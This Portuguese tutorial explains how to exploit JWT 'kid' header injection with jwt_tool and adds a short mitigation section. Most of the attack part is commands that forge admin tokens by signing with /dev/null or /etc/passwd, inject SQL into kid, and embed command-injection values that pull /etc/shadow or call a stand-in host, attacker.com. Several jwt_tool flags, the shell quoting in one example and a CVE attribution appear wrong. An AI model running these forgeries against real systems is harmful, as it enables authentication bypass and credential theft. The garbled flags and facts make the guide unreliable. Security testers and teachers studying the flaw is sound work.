---
title: Teste de Injeção do Parâmetro Kid em JWT com jwt_tool
description: Um guia abrangente para explorar e mitigar ataques de injeção do cabeçalho kid (Key ID) em JWT usando o kit de ferramentas de segurança jwt_tool.
created: 2026-06-22
tags:
  - jwt
  - security
  - vulnerability
  - injection
  - jwt_tool
  - testing
status: draft
---

# Teste de Injeção do Parâmetro Kid em JWT com jwt_tool

## O que é Injeção de Kid em JWT?

O `kid` (Key ID) é um parâmetro opcional do cabeçalho definido na RFC 7515 que ajuda o servidor a identificar qual chave criptográfica deve ser usada para verificar a assinatura do JWT. Quando uma aplicação recupera dinamicamente a chave de verificação com base no valor não sanitizado do `kid` fornecido pelo atacante, abre-se porta para vários ataques críticos:

- **Path Traversal** – O atacante define `kid` como um caminho de arquivo arbitrário (ex.: `/dev/null`, `../../etc/passwd`). O servidor lê esse arquivo e usa seu conteúdo bruto como segredo HMAC, permitindo a falsificação de assinaturas.
- **SQL Injection** – Se a chave é obtida de um banco de dados (ex.: `SELECT key FROM keys WHERE kid='$kid'`), o atacante pode injetar SQL para retornar um valor controlado.
- **Command Injection / SSRF** – Raro, mas ocorre quando `kid` é passado não sanitizado para um comando shell ou requisição HTTP externa.

## Por que isso importa

Uma injeção bem-sucedida de `kid` contorna completamente a autenticação JWT, permitindo que um atacante:
- Forjar tokens com payloads arbitrários (ex.: `"role":"admin"`)
- Escalar privilégios sem nenhuma credencial válida
- Assumir contas de usuário ou painéis administrativos

Essa vulnerabilidade tem sido responsável por múltiplos CVEs e continua sendo um item essencial em avaliações de segurança de aplicações web modernas e desafios CTF.

## Apresentando o jwt_tool

`jwt_tool` é um poderoso kit de ferramentas de código aberto para auditar, testar e forjar JSON Web Tokens. Ele automatiza muitos ataques comuns de JWT, incluindo confusão de algoritmo, injeção de `kid`, adulteração de payload e bypass de verificação de assinatura. Desenvolvido por [ticarpi](https://github.com/ticarpi/jwt_tool), é amplamente utilizado por testadores de penetração e pesquisadores de segurança.

## Instalação

### Opção 1: Clonar do GitHub (recomendado)

```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 -m pip install -r requirements.txt
```

Torne a ferramenta executável:

```bash
chmod +x jwt_tool.py
```

### Opção 2: Instalar via pip (se disponível)

```bash
pip install jwt-tool
```

> **Nota:** A versão do GitHub é atualizada com mais frequência. Sempre puxe a versão mais recente se estiver executando a partir do código fonte.

## Uso Básico

`jwt_tool` pode ser invocado como uma ferramenta de linha de comando com um JWT alvo. A sintaxe geral é:

```bash
python3 jwt_tool.py <jwt_token> [options]
```

Para varredura interativa:

```bash
python3 jwt_tool.py <jwt_token> -t
```

## Explorando a Injeção de Kid com jwt_tool

### 1. Path Traversal via Kid (Mais Comum)

O ataque clássico: defina `kid` como `/dev/null` ou qualquer arquivo conhecido, e assine o token com uma string vazia ou o conteúdo do arquivo.

**Passo 1 – Varra o JWT e identifique o parâmetro kid**

```bash
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQifQ.eyJzdWIiOiJ1c2VyIiwicm9sZSI6Im1lbWJlciJ9.sjKl7FhBfJ9J3wC6eVkIo4m7kA9nN3g"
```

A saída destacará as claims do cabeçalho e do payload, incluindo `kid`.

**Passo 2 – Forje um token com injeção de kid**

`jwt_tool` fornece a flag `-X i` para ataques de injeção de `kid`. Use `-I` para editar o payload e `-pv` para definir um novo valor.

```bash
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQifQ.eyJzdWIiOiJ1c2VyIiwicm9sZSI6Im1lbWJlciJ9.sjKl7FhBfJ9J3wC6eVkIo4m7kA9nN3g" \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "/dev/null"
```

**Explicação:**
- `-I` : modificar interativamente as claims do payload.
- `-pc "role" -pv "admin"` : alterar a claim `role` para `"admin"`.
- `-X i` : realizar injeção de `kid`.
- `-k "/dev/null"` : usar `/dev/null` como arquivo de chave. `jwt_tool` assina o token usando o conteúdo desse arquivo (string vazia para `/dev/null`).

A ferramenta gera um novo JWT forjado que o servidor aceitará se ler `/dev/null` como a chave de verificação.

**Alternativa: Usando `/etc/passwd` como segredo**

```bash
python3 jwt_tool.py <token_original> \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "../../../etc/passwd"
```

Quando o servidor lê `/etc/passwd`, ele usa todo o seu conteúdo como segredo HMAC. `jwt_tool` assina automaticamente com esse conteúdo.

### 2. Injeção SQL via Kid

Se o servidor consulta um banco de dados pela chave usando o valor `kid`, você pode injetar um payload SQL para retornar um valor conhecido.

**Exemplo:** Crie um token com `kid` definido para:

```json
{
  "alg": "HS256",
  "kid": " ' UNION SELECT 'known_secret' -- "
}
```

`jwt_tool` não possui um automatismo de injeção SQL embutido, mas você pode criar manualmente o cabeçalho e depois assiná-lo usando `-X i` com uma chave personalizada.

**Forjamento manual com cabeçalho personalizado:**

```bash
python3 jwt_tool.py <jwt_base> \
  -X i \
  -k "known_secret" \
  --header '{"alg":"HS256","kid":"' UNION SELECT 'known_secret' -- "}'
```

Em seguida, ajuste o payload com `-I` conforme necessário.

### 3. Injeção de Comando via Kid

Raro, mas possível quando `kid` é interpolado em um comando shell, ex.:

```
curl https://keyserver.example.com/keys/$(kid)
```

Defina `kid` como um payload de injeção de comando:

```json
"kid": "$(curl -s http://attacker.com/steal?)"
```

`jwt_tool` pode incluir valores de cabeçalho arbitrários:

```bash
python3 jwt_tool.py <jwt> \
  --header '{"alg":"RS256","kid":"$(cat /etc/shadow | base64)"}' \
  -X i -k dummy_secret
```

> **Nota:** A exploração depende do ambiente de execução do servidor e da forma como `kid` é processado.

## Principais Recursos do jwt_tool para Injeção de Kid

| Recurso | Comando / Flag | Descrição |
|---------|---------------|-------------|
| Ataque de injeção de Kid | `-X i` | Automatiza o processo de definir um `kid` forjado e assinar com um segredo baseado em arquivo. |
| Confusão de algoritmo | `-X a` | Combinado com `-X i` para ataques híbridos (mudar de RS256 para HS256 após obter a chave pública). |
| Adulteração de payload | `-I` / `-pc` / `-pv` | Modificar interativamente ou não interativamente qualquer claim. |
| Arquivo de chave personalizado | `-k <file>` | Especifica o arquivo cujo conteúdo será usado como segredo HMAC ao forjar. |
| Análise de incompatibilidade de assinatura | `-S` / `-s` | Verificar o comportamento do token com assinaturas alteradas. |
| Base de dados de segredos JWT conhecidos | `-C` | Tentar segredos fracos comuns durante força bruta. |
| Manipulação avançada de cabeçalho | `--header` | Inserir JSON arbitrário no cabeçalho (útil para payloads `kid` brutos). |

## Juntando Tudo: Cenário Completo de Exploração

Considere uma API vulnerável que usa JWT para autenticação. O servidor obtém a chave de verificação lendo o arquivo especificado em `kid`:

```python
# Código vulnerável (pseudocódigo)
def verify_token(token):
    header = decode_header(token)
    kid = header['kid']
    with open('/keys/' + kid, 'r') as f:
        secret = f.read()
    return jwt.decode(token, secret, algorithms=['HS256'])
```

**Passo 1 – Reconhecimento**

```bash
python3 jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImNsaWVudCJ9.eyJzdWIiOiJ1c2VyIn0.QPx..."
```

A saída mostra `alg: RS256`, `kid: client`.

**Passo 2 – Verificar se path traversal é possível**

Tente acessar `/dev/null`:

```bash
python3 jwt_tool.py <token> -X i -k /dev/null
```

Se o servidor retornar uma resposta 200 com o token forjado, a vulnerabilidade está confirmada.

**Passo 3 – Escalar privilégios**

```bash
# Forjar token com papel admin
python3 jwt_tool.py <original> \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "/dev/null"
```

**Passo 4 – Usar o token forjado para acessar recursos protegidos**

```bash
curl -H "Authorization: Bearer <token_forjado>" https://api.target.com/admin
```

## Estratégias de Mitigação (Lado do Servidor)

1. **Whitelist de valores Kid permitidos** – Codifique um mapeamento de strings `kid` conhecidas para suas chaves públicas correspondentes. Nunca derive a chave a partir da entrada do usuário.

2. **Validar o formato do Kid** – Se a consulta dinâmica for inevitável, aplique verificações rigorosas de formato: apenas alfanumérico, rejeite separadores de caminho (`.` , `/`), rejeite caracteres suspeitos.

3. **Usar chaves codificadas** – A abordagem mais segura é incorporar a chave pública esperada no código da aplicação ou em um arquivo de configuração.

4. **Impor a aplicação do algoritmo** – Sempre verifique se o algoritmo usado no token corresponde ao algoritmo esperado para aquele emissor. Não confie no cabeçalho `alg`.

5. **Empregar uma biblioteca JWT com proteção embutida** – Bibliotecas modernas como `PyJWT`, `jsonwebtoken` e `jose` podem ser configuradas para rejeitar valores `kid` desconhecidos ou exigir um conjunto de chaves estático.

## Conclusão

`jwt_tool` é uma ferramenta indispensável para testar vulnerabilidades de injeção de `kid` em JWT. Ela automatiza os caminhos de exploração mais comuns e fornece um fluxo de trabalho claro e repetível para testadores de segurança. Entender como usar suas flags `-X i` e `-I` pode significar a diferença entre um achado perdido e um bypass crítico de autenticação.

Lembre-se sempre de tratar `kid` como **entrada não confiável** no lado do servidor. Para desenvolvedores, algumas linhas de validação de entrada podem eliminar uma classe inteira de ataques JWT.

## Referências

- [github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
- [RFC 7515 – JSON Web Signature](https://datatracker.ietf.org/doc/html/rfc7515)
- [JWT Attacks (Part 4c): kid Header Injection](https://jwt.io/introduction/)
- [CVE-2018-0114](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114) – node-jsonwebtoken key confusion
- [PortSwigger JWT Kid Lab](https://portswigger.net/web-security/jwt)